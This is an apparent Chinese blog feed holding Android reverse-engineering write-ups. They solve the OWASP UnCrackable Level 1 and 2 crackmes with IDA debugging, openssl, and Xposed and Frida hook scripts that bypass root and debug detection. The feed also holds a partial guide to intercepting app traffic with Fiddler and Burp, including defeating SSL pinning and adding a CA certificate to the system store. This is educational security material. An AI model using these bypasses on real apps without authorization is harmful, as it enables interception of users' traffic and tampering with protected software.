src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920922/OWASP/OWASP-2/26.png" alt></p><p> 这时候会出现一个弹窗, 点击<code>Debug option</code>, 勾选上框出来的3项。点击OK之后, 在hostname里面填写127.0.0.1即可。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920922/OWASP/OWASP-2/27.png" alt><br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920922/OWASP/OWASP-2/28.png" alt></p><p> 之后会出现手机加载的进程, 我们只需要选中我们想调试的<code>uncrackable2</code>, 就可以进入IDA的调试界面。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920922/OWASP/OWASP-2/29.png" alt></p><p> 之后使用jdb使应用继续运行, 因为上面的DDMS几次重新打开, 所以端口映射部分会不一致。我们在使用jdb调试的时候, 最好还是先打开DDMS, 查看应用真正映射的端口, 否则会出现<code>无法附加到目标 VM</code>的错误, 按照下面的显示结果, 我们需要输入命令<code>jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8605</code>(8700端口被DDMS进程占用, 改为8605端口, 不开DDMS就不用改)。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920922/OWASP/OWASP-2/30.png" alt><br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920922/OWASP/OWASP-2/31.png" alt></p><p> 双开IDA计算进程动态运行时我们想要定位的函数的地址, 在动态调试的IDA按下<code>F9</code>快捷键让程序正常运行, 这时候我们就能在IDA右侧<code>Module</code>板块搜索到<code>libfoo.so</code>动态加载的地址<code>0x0000007B11291000</code>, 之后我们从分析静态<code>libfoo.so</code>的IDA中获取函数<code>CodeCheck</code>函数的偏移量为<code>0xDAC</code>, 所以最后我们能够计算出我们要跳转到<code>0x0000007B11291DAC</code>。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920922/OWASP/OWASP-2/32.png" alt><br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920922/OWASP/OWASP-2/33.png" alt></p><p>按下快捷键<code>G</code>, 跳转到我们计算的CodeCheck函数开始的地址(<code>0x0000007B11291DAC</code>), 发现代码不能解析出来, 选中部分代码, 用快捷键<code>C</code>解析代码(一次不行就先按<code>C</code>再按下<code>Force</code>)。然后在地址<code>0x0000007B11291DAC</code>下断点, 在手机应用界面上输入随便输入长度为23的字符串之后点击<code>Verify</code>, 就可以运行到如下位置。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920922/OWASP/OWASP-2/34.png" alt></p><p>在动态调试汇编代码的过程中, 会发现我们很难根据变量名获取其中的值, 只能在调试的过程中看到寄存器中存储的内容, 将静态调试的IDA中的汇编代码和动态调试过程中的IDA的代码进行比对, 我们可以找出一些函数, 比如这里的<code>strncmp</code>的函数的位置, 也可以通过静态分析的IDA找到<code>strncmp</code>函数的位置(<code>0x0000007B11291000+0xE5C=0x0000007B11291E5C</code>), 选中<code>unk_7B11281820</code>, 使用快捷键<code>N</code>可将地址名重命名为<code>.strncmp</code>。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920922/OWASP/OWASP-2/35.png" alt></p><p>IDA右侧有<code>General Registers</code>窗口, 但是这个窗口只会出现地址, 而我们需要获取寄存器中的值, <code>View-&gt;Open subviews-&gt;Hex dump</code>可以查看内存中的数值。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920922/OWASP/OWASP-2/36.png" alt></p><p><code>F8</code>单步调试到<code>BL .strncmp</code>处, 这时候我们就能看到传递的参数寄存器X1和X0存放的地址。鼠标移至X0存放的地址, 右键选中<code>Select All</code>, 复制地址。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920922/OWASP/OWASP-2/37.png" alt></p><p>转到<code>Hex View-3</code>的窗口, 按下快捷键<code>G</code>, 跳转到刚刚我们复制的地址处。可以看到我们刚刚在应用中输入的数值, 想要获取X1的值可以用一样的方法, 最终我们得到要输入的密码为<code>Thanks for all the fish</code>。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920922/OWASP/OWASP-2/38.png" alt><br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920922/OWASP/OWASP-2/39.png" alt></p><p>IDA动态调试的过程就到这里结束了, 下面还有一种不patch apk的方法可以实现绕过反调试和各种检测的方法, 使用到了Radare2, 感觉重要的是学习思路而不是工具如何使用这句话, 还是很有道理的。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>实际上最近有很多事情要做, 配置Radare2及其插件上, 我花了很多时间, 现在还有一个小插件没安装好。为了推着自己完成这篇系列文章, 就把UnCrackable2完成的部分先发出来。希望我能尽快完成环境的配置还有之后的文章吧…..</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;从&lt;a href=&quot;https://www.52pojie.cn/thread-1048786-1-1.html&quot; target=&quot;_bla
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="http://Se8S0n.github.io.git/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>从OWASP CrackMe学Android逆向(一)</title>
    <link href="http://Se8S0n.github.io.git/2019/11/05/%E4%BB%8EOWASP-CrackMe%E5%AD%A6Android%E9%80%86%E5%90%91-%E4%B8%80/"/>
    <id>http://Se8S0n.github.io.git/2019/11/05/从OWASP-CrackMe学Android逆向-一/</id>
    <published>2019-11-06T00:40:47.000Z</published>
    <updated>2021-08-05T06:51:27.399Z</updated>
    
    <content type="html"><![CDATA[<h2 id="准备环境、工具"><a href="#准备环境、工具" class="headerlink" title="准备环境、工具"></a>准备环境、工具</h2><p>Pixel(Magisk+Xposed/EdXposed)<br>这里要安利一下Magisk，它现在有个超强的Magisk Hide功能，能隐藏root状态，不过我还没研究过它的原理，如果后面有机会的话会稍微整理一下的。</p><h2 id="UnCrackable-Level1"><a href="#UnCrackable-Level1" class="headerlink" title="UnCrackable-Level1"></a>UnCrackable-Level1</h2><p>进入到存有UnCrackable的文件目录下，<code>adb install UnCrackable-Level1.apk</code>把APK安装到手机上。打开应用之后，发现应用存在root检测，一旦发现了root状态，点击OK之后应用就会被kill。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572919408/OWASP/1.png" alt><br>可以反编译apk之后patch root检测部分的内容，重打包之后安装到手机里面绕过root检测，也可以用Magisk自带的Magisk Hide绕过。Magisk Hide设置方法如下：<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572919459/OWASP/2.png" alt><br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572919460/OWASP/3.png" alt><br>当然第二张图里会不一样，我们需要选中UnCrackable-Level1.apk。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572919460/OWASP/4.png" alt></p><p>随便输个内容，按下VERIFY，发现出现了个弹窗，要我们再试一下。OK，可以看出我们应该从反编译apk开始入手，找找它这个验证的代码逻辑，看看能不能找到正确的字符串，或者看看有没有方法绕过这样的条件判断。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572919461/OWASP/5.png" alt></p><p>如果代码量过大的话，我们可以通过<code>adb shell dumpsys activity top | findstr ACTIVITY</code>定位要找的界面的代码。像下面这样，就能定位到界面<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572919463/OWASP/6.png" alt></p><p>不过用JEB看一下，发现这个代码量真的不是很大….用JEB打开MainActivity之后看到一个verify的函数没有经过混淆，看代码逻辑，判断的条件由a.a()函数传递，返回的是一个boolean类型的值。如果Level1真要让我们弹出Success的话，就没什么意思了，那就跟进a.a()函数里面看看。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572919464/OWASP/7.png" alt></p><p>发现a.a()中调用了加密的算法，之后将用户输入的值也就是arg5与加密后的结果进行比对，若比对成功的话，就说明我们输入的是正确的。明显这个crackme的意图不是要我们patch源代码然后得到弹窗Success, 而是获得flag, 也就是密文<code>5UJiFctbmgbDoLXmpL12mkno8HT4Lv8dlat8FxR2GOc=</code>解密后的结果。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572919464/OWASP/8.png" alt></p><h3 id="CTF解题法"><a href="#CTF解题法" class="headerlink" title="CTF解题法"></a>CTF解题法</h3><p>可以使用动态和静态两种方法获得明文, 静态的方法参照文章<a href="https://nankeen.me/posts/owasp-android-level1/" target="_blank" rel="noopener">OWASP Android Crackme Level 1</a>, 文章的作者使用了openssl和硬编码在源码中的密钥<code>8d127684cbc37c17616d806cf50473cc</code>解密<code>5UJiFctbmgbDoLXmpL12mkno8HT4Lv8dlat8FxR2GOc=</code>。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572919465/OWASP/9.png" alt><br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572919466/OWASP/10.png" alt><br>通过代码我们可以知道AES算法使用了ECB加密模式, 且在CTF中AES-128加密算法的密钥一般为32位, 输入命令<code>echo 5UJiFctbmgbDoLXmpL12mkno8HT4Lv8dlat8FxR2GOc= | openssl enc -aes-128-ecb -base64 -d -nopad -K 8d127684cbc37c17616d806cf50473cc</code>可获取flag<code>I want to believe</code>。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572919467/OWASP/11.png" alt></p><h3 id="Xposed解法"><a href="#Xposed解法" class="headerlink" title="Xposed解法"></a>Xposed解法</h3><p>感觉上面的方法太巧妙了, 下面会补充一个没那么巧妙且常用的方法——Xposed hook, 我一开始找到函数a.a(), 但是因为参数类型填写不正确的原因, 加上该函数实际上返回的是<code>byte []</code>类型的数据, 所以不能得到正确的flag, Xposed模块param.getResult()的返回值又是String类型的数据，所以在这里我们需要处理数据转换的问题。具体的Xposed模块代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">package com.example.unlock;</span><br><span class="line"></span><br><span class="line">import android.util.Log;</span><br><span class="line">import de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line">import de.robv.android.xposed.XC_MethodHook;</span><br><span class="line">import de.robv.android.xposed.XC_MethodReplacement;</span><br><span class="line">import de.robv.android.xposed.XposedBridge;</span><br><span class="line">import de.robv.android.xposed.XposedHelpers;</span><br><span class="line">import de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line">import static de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line">public class HookMain implements IXposedHookLoadPackage &#123;    </span><br><span class="line">    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam lpparam) throws Throwable &#123;               </span><br><span class="line">        if(!lpparam.packageName.equals(&quot;owasp.mstg.uncrackable1&quot;)) //过滤包名</span><br><span class="line">            return; </span><br><span class="line">        XposedBridge.log(&quot;Loaded app: &quot; + lpparam.packageName);        //Hook a方法        </span><br><span class="line">        try &#123;              </span><br><span class="line">            XposedHelpers.findAndHookMethod(&quot;sg.vantagepoint.a.a&quot;, lpparam.classLoader, &quot;a&quot;, byte [].class, byte [].class, new XC_MethodHook() &#123;                </span><br><span class="line">                @Override                </span><br><span class="line">                protected void beforeHookedMethod(XC_MethodHook.MethodHookParam param) throws Throwable &#123;                                 </span><br><span class="line">                &#125;                            </span><br><span class="line">                protected void afterHookedMethod(XC_MethodHook.MethodHookParam param) throws Throwable &#123;                    </span><br><span class="line">                    // 转换数据类型</span><br><span class="line">                    String flag = new String((byte []) param.getResult()); </span><br><span class="line">                    // 在这里使用Log.i()可能会输出失败, 最好还是用XposedBridge.log</span><br><span class="line">                    XposedBridge.log(&quot;SECRET: &quot; + flag);               </span><br><span class="line">                &#125;            </span><br><span class="line">           &#125;);       </span><br><span class="line">        &#125; catch (Throwable e)&#123;            </span><br><span class="line">            XposedBridge.log(&quot;hook failed&quot;);            </span><br><span class="line">            XposedBridge.log(e);       </span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>安装Xposed模块并重启之后，随便输入之后提交，得到flag<code>I want to believe</code>。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572919467/OWASP/12.png" alt></p><h3 id="Frida解题法"><a href="#Frida解题法" class="headerlink" title="Frida解题法"></a>Frida解题法</h3><p>还可以按照wp <a href="https://enovella.github.io/android/reverse/2017/05/18/android-owasp-crackmes-level-1.html" target="_blank" rel="noopener">Level1 Writeup</a>使用Frida hook代码获取flag。</p><p>Frida使用的过程中不能和Magisk Hide一起使用, 不然会出现<code>Failed to spawn: unable to access zygote64 while preparing for app launch; try disabling Magisk Hide in case it is active</code>的报错。所以我们需要先关掉Magisk Hide(Magisk Manager &gt; Settings &gt;Magisk &gt; Magisk Hide (关掉)), 并且还要在Frida脚本里面绕过root的检测。</p><p>因为之前没有接触过Frida, 也算是用这个实例来学习Frida的使用, 如果跟我一样不是很熟悉Frida, 可以配合<a href="https://www.frida.re/docs/javascript-api/#java" target="_blank" rel="noopener">Frida的官方文档</a>一起食用, 文档中有Frida的js API使用说明, 下面的代码主要涉及的是调用Java函数的部分。作者在这里写的绕过root和debug的思路我觉得值得学习和思考, 有种听君一席话, 胜读十年书的感觉。当然, 这样讲还是有点夸张的, 不过真的很值得学习。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(function () &#123;</span><br><span class="line">  send(&quot;Starting hooks OWASP uncrackable1...&quot;);</span><br><span class="line">  /*</span><br><span class="line">    hook java.lang.System.exit, 使该函数只用来输出下面的字符串</span><br><span class="line">    避免了应用的检测机制导致应用退出, 使用该方法绕过Java层的root/debug检测 </span><br><span class="line">  */</span><br><span class="line">  var sysexit = Java.use(&quot;java.lang.System&quot;);</span><br><span class="line">  sysexit.exit.overload(&quot;int&quot;).implementation = function(var_0) &#123;</span><br><span class="line">    send(&quot;java.lang.System.exit(I)V  // We avoid exiting the application  :)&quot;);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  var aes_decrypt = Java.use(&quot;sg.vantagepoint.a.a&quot;);</span><br><span class="line">  aes_decrypt.a.overload(&quot;[B&quot;,&quot;[B&quot;).implementation = function(var_0,var_1) &#123;</span><br><span class="line">    send(&quot;sg.vantagepoint.a.a.a([B[B)[B   doFinal(enc)  // AES/ECB/PKCS7Padding&quot;);</span><br><span class="line">    send(&quot;Key       : &quot; + var_0);</span><br><span class="line">    send(&quot;Encrypted : &quot; + var_1);</span><br><span class="line">    /*</span><br><span class="line">      重载解密函数, 并获取其返回值, 因其类型为byte [], </span><br><span class="line">      js在调用Java方法之后只能返回一个对象, 而不是返回一个byte类型的数组</span><br><span class="line">    */</span><br><span class="line">    var ret = this.a.overload(&quot;[B&quot;,&quot;[B&quot;).call(this,var_0,var_1);</span><br><span class="line">    send(&quot;Decrypted : &quot; + ret);</span><br><span class="line"></span><br><span class="line">    var flag = &quot;&quot;;</span><br><span class="line">    //将char类型转换为String类型</span><br><span class="line">    for (var i=0; i &lt; ret.length; i++)&#123;</span><br><span class="line">      flag += String.fromCharCode(ret[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    send(&quot;Decrypted flag: &quot; + flag);</span><br><span class="line">    return ret; //[B</span><br><span class="line">  &#125;; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  var mainactivity = Java.use(&quot;sg.vantagepoint.uncrackable1.MainActivity&quot;);</span><br><span class="line">  mainactivity.onStart.overload().implementation = function() &#123;</span><br><span class="line">    send(&quot;MainActivity.onStart() HIT!!!&quot;);</span><br><span class="line">    var ret = this.onStart.overload().call(this);</span><br><span class="line">  &#125;;</span><br><span class="line">  //var mainactivity = Java.use(&quot;sg.vantagepoint.uncrackable1.MainActivity&quot;);</span><br><span class="line">  mainactivity.onCreate.overload(&quot;android.os.Bundle&quot;).implementation = function(var_0) &#123;</span><br><span class="line">    send(&quot;MainActivity.onCreate() HIT!!!&quot;);</span><br><span class="line">    var ret = this.onCreate.overload(&quot;android.os.Bundle&quot;).call(this,var_0);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  var activity = Java.use(&quot;android.app.Activity&quot;);</span><br><span class="line">  activity.onCreate.overload(&quot;android.os.Bundle&quot;).implementation = function(var_0) &#123;</span><br><span class="line">    send(&quot;Activity HIT!!!&quot;);</span><br><span class="line">    var ret = this.onCreate.overload(&quot;android.os.Bundle&quot;).call(this,var_0);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  send(&quot;Hooks installed.&quot;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>这里小小啰嗦一下Frida的使用方法, 安装的话直接<code>pip install frida-tools</code>, 还有下载适合自己设备的frida-server的版本, push进设备, 加上权限就行。下面是对frida-server进行的操作的操作：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ adb shell</span><br><span class="line">$ su</span><br><span class="line"># cd /data/local/tmp # 进入frida-server的目录下</span><br><span class="line"># ./frida-server &amp;</span><br></pre></td></tr></table></figure></p><p>之后重新开一个cmd窗口, 进入.js脚本, 也就是hook的脚本所在的目录下执行<code>frida -U owasp.mstg.uncrackable1 -l cracker.js</code>(我的hook文件名为cracker.js),  就能获取flag：<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572919470/OWASP/13.png" alt></p><h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>其实在使用Frida绕过应用检测的时候我想到一个问题, 我认为重载<code>java.lang.System.exit</code>的方法只能绕过Java层调用的exit函数, 而不能绕过native层的函数。Java层，测试后已知hook<code>java.lang.System.exit</code>是不能阻止应用被系统层强制退出的。而native层的, 还没遇到一个这样的demo可以用来测试, 但是我猜测native层的还是需要hook native层的exit函数。如果跳出了这两个层级, 直接对系统层的exit进行注入, 会导致系统崩溃吗？如我的思考或文章出现了错误，希望各位大佬不吝赐教。</p><p>最后，附上<a href="https://github.com/OWASP/owasp-mstg/tree/master/Crackmes/Android" target="_blank" rel="noopener">CrackMe的下载链接</a>。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;准备环境、工具&quot;&gt;&lt;a href=&quot;#准备环境、工具&quot; class=&quot;headerlink&quot; title=&quot;准备环境、工具&quot;&gt;&lt;/a&gt;准备环境、工具&lt;/h2&gt;&lt;p&gt;Pixel(Magisk+Xposed/EdXposed)&lt;br&gt;这里要安利一下Magisk，它现在
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="http://Se8S0n.github.io.git/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>Android抓包总结</title>
    <link href="http://Se8S0n.github.io.git/2019/10/12/Android%E6%8A%93%E5%8C%85%E6%80%BB%E7%BB%93/"/>
    <id>http://Se8S0n.github.io.git/2019/10/12/Android抓包总结/</id>
    <published>2019-10-12T21:16:47.000Z</published>
    <updated>2021-08-05T06:51:27.271Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这篇文章算是总结一下我之前抓包遇到的一些问题, 个人属性里带bug, 所以遇到的问题会比较多, 算是给大家提供一个抓包抓不到应该如何解决的思路。</p><h1 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h1><p>Android中可用的抓包软件有fiddler、burpsuite、Charls、HttpCanary、Packet Capture、tcpdump、wireshark等等。tcpdump和wireshark可以解决部分不是使用HTTP/HTTPS协议传输数据的app, 用tcpdump抓包, 用wireshark分析数据包。</p><p>如果想抓取三大运营商传输的数据包并分析, 因其路由规则的限制, 可能还是需要在android系统中利用iptables设置反向代理, 用Fiddler解密数据包之后分析, 不过好像Fiddler好像有自己的反向代理设置方法, 这部分了解不多。</p><p>Charls是Mac上常见的抓包工具, 我没用过, 不过网上蛮多教程的。HttpCanary和Packet Capture这两个工具与常规的电脑上的代理抓包不同的是, 能保证一定能抓取到数据包, 我一般都用Packet Capture来验证应用是否发送请求。HttpCanary被称为移动端的Fiddler, 能够改包和劫持双向认证的应用传输的数据包, 感觉还是蛮强大的。</p><h2 id="Fiddler抓取Android数据包"><a href="#Fiddler抓取Android数据包" class="headerlink" title="Fiddler抓取Android数据包"></a>Fiddler抓取Android数据包</h2><h3 id="基础设置"><a href="#基础设置" class="headerlink" title="基础设置"></a>基础设置</h3><ol><li>下载好Fiddler之后, 打开该软件, 生成证书。</li></ol><p><img src="https://uploader.shimo.im/f/YoRSSTOAm40HjvOk.png!thumbnail" alt></p><p>设置连接</p><p><img src="https://uploader.shimo.im/f/8Hrm7NrNnUkCGojo.png!thumbnail" alt></p><p>设置HTTPS</p><p><img src="https://uploader.shimo.im/f/K2U52kjjZ0Aafipf.png!thumbnail" alt></p><p>用ipconfig查看当前主机的ip</p><p><img src="https://uploader.shimo.im/f/oTd5nyZ8J5AF3cax.png!thumbnail" alt></p><p>手机和电脑在同一局域网中即可, 手机端设置WLAN种给网络设置代理, 选择对应的WLAN, 选中修改网络, 手动设置代理, 主机名填上面电脑ip地址, 端口写fiddler默认端口8888。</p><p><img src="https://uploader.shimo.im/f/WaBtKFdDBtkvIwGE.png!thumbnail" alt></p><p>手机端用浏览器访问<a href="http://电脑IP:端口" target="_blank" rel="noopener">http://电脑IP:8</a>888, 观察网络是否访问成功, 成功之后, 点击”FiddlerRoot.certificate”下载Fiddler的证书并安装。</p><p><img src="https://uploader.shimo.im/f/iezwWVp7kjMiC2tJ.png!thumbnail" alt></p><p>如果上述步骤都原原本本做完了, 还是不能出现上图的效果, 可以换个路由或者直接手机开热点。我当时遇到不能访问的问题, ping了一下, 一直显示destination unreachable, 应该是路由器安全规则的限制, 换成了手机开热点就ok了。</p><p>继续进行测试的时候, 发现不管是修改密码还是用验证码进行登录, 我都抓不到那些包。想不出是哪里出了问题…..大概找了一下, 发现是SSL Pinning的机制阻止了我抓包。使用了Xposed+JustTrustMe, 就抓取到数据包了, 数据包如下：</p><p><img src="https://uploader.shimo.im/f/YagZMTHURpYeFDV1.png!thumbnail" alt></p><p>如果知道Fiddler怎么抓包了, 不知道怎么改包, 可以用Fiddler左下角的黑框框中断请求, 修改之后再发出, 比如输入<code>bpu baidu.com</code>就可以中断所有发向baidu.com的请求。</p><p><img src="https://uploader.shimo.im/f/hRhy1vVAJy8uhCf5.png!thumbnail" alt></p><p>之后查看中断的数据包会出现如下效果, 修改完点击Run to Completion就可以把请求发出去了。</p><p><img src="https://uploader.shimo.im/f/yYfWjk6WnhEpv2u2.png!thumbnail" alt></p><h3 id="Fiddler设置之后手机无法连接上代理"><a href="#Fiddler设置之后手机无法连接上代理" class="headerlink" title="Fiddler设置之后手机无法连接上代理"></a>Fiddler设置之后手机无法连接上代理</h3><ol><li><p>关闭电脑防火墙</p></li><li><p>打开注册表（cmd-regedit）, 在HKEY_CURRENT_USER\Software\Microsoft\Fiddler2下创建一个DWORD, 值置为80（十进制）[在空白处右键即可创建]。</p></li></ol><p><img src="https://uploader.shimo.im/f/Qfnh75TSPSUEqjvl.png!thumbnail" alt></p><ol start="3"><li>编写fiddlerScript rule：在Fiddler上点击Rules-&gt;Customize Rules, 用Ctrl+F查找OnBeforeRequest方法添加一行代码。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">if (oSession.host.toLowerCase() == &quot;webserver:8888&quot;) </span><br><span class="line">&#123;</span><br><span class="line">        oSession.host = &quot;webserver:80&quot;; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Burpsuite抓取Android数据包"><a href="#Burpsuite抓取Android数据包" class="headerlink" title="Burpsuite抓取Android数据包"></a>Burpsuite抓取Android数据包</h2><h3 id="基础设置-1"><a href="#基础设置-1" class="headerlink" title="基础设置"></a>基础设置</h3><p>Burpsuite改包的步骤就不在这里赘述了, 网上有很多教程, 接下来我们要设置burpsuite, 以求抓取到数据包, 设置如下：</p><p><img src="https://uploader.shimo.im/f/M3xHMTeMagI3ZsVX.png!thumbnail" alt></p><p>提示, 监听的端口号、电脑内网ip要和手机上的代理设置一致, 电脑内网ip可以用ipconfig查看。用burpsuite一直抓取不到https的证书, 怀疑是我burpsuite证书没有安装到手机上, 所以我现在先将它装到系统证书中, 再看看能不能先抓取到https的证书。</p><h3 id="安装证书至系统中"><a href="#安装证书至系统中" class="headerlink" title="安装证书至系统中"></a>安装证书至系统中</h3><p>1、下载.der格式的证书, 将下载的cacert.der转换格式, 并获取证书hash值, 生成&lt;证书hash&gt;.0文件, 例如：7bf17d07.0</p><p>2、把&lt;证书hash&gt;.0证书push到/data/local/tmp目录下后移动至/system/etc/security/cacerts/<br>(mv操作出错之后, 先试一下“mount -o rw,remount /system”如果出现了报错“mount: ‘/system’ not in /proc/mounts”, 再尝试“mount -o rw,remount /”, 就可以操作system目录了)</p><p>3、重启手机</p><p>只有root环境才能将proxy证书安装至android系统证书中, 这种方法好像能绕过应用本地证书校验, 其实burp和Fiddler还有其他的代理证书的安装方法都差不多, 最后将&lt;hash证书&gt;.0的文件mv至/system/etc/security/cacerts/目录下即可, 不建议直接将用户证书直接mv, 可能会导致环境出错也不好排查证书错误, 甚至可能导致android网络环境出错。</p><p>下面是具体步骤, 先在设置本地代理, 将burpsuite证书下载下来</p><p><img src="https://uploader.shimo.im/f/YUZrOUhhlz0L29of.png!thumbnail" alt></p><p>打开浏览器输入本地地址, 下载.der格式的证书</p><p><img src="https://uploader.shimo.im/f/avX8JsfgDlctG0ed.png!thumbnail" alt></p><p>此处参照文章<a href="[https://blog.chenjia.me/articles/171029-223953.html](https://blog.chenjia.me/articles/171029-223953.html">BrupSuit证书导入Android7.0以上手机</a>, 因为我windows本地安装了ubuntu的子系统, 所以直接用ubuntu1604子系统对证书进行操作。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 转换证书的格式</span><br><span class="line">$ openssl x509 -in cacert.der -inform DER -out cacert.pem -outform PEM</span><br><span class="line">// 提取证书的hash</span><br><span class="line">$ openssl x509 -inform PEM -subject_hash -in cacert.pem</span><br></pre></td></tr></table></figure><p><img src="https://uploader.shimo.im/f/5QTxCTgXqtk6iuP8.png!thumbnail" alt></p><p>上图中的<code>7bf17d07</code>就为证书的hash值, 将该目录下生成的<code>7bf17d07.0</code>文件push到手机中, 最后移动到/system/etc/security/cacerts/目录下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ adb push 7bf17d07.0 /data/local/tmp</span><br><span class="line">$ adb shell </span><br><span class="line">sailfish:/ $ su</span><br><span class="line">sailfish:/ # mount -o rw,remount / # 拥有操作/目录的权限, 本意是要操作/system目录</span><br><span class="line">sailfish:/ # mv /data/local/tmp/7bf17d07.0 /system/etc/security/cacerts/7bf17d07.0</span><br></pre></td></tr></table></figure><p>按照原本的文章应该给<code>7bf17d07.0</code>文件添加644权限, 但是我具体操作的时候没有添加权限也成功了, 如果按照我上面的步骤出错了, 可以尝试给文件添加权限。重启之后可以看到证书安装成功。</p><p> <img src="https://uploader.shimo.im/f/V8pmRZPj8NgmQ6TQ.png!thumbnail" alt></p><p>第一次安装证书的时候出现了不能访问使用https协议的网站, 应该是我测试的手机环境出现了问题, 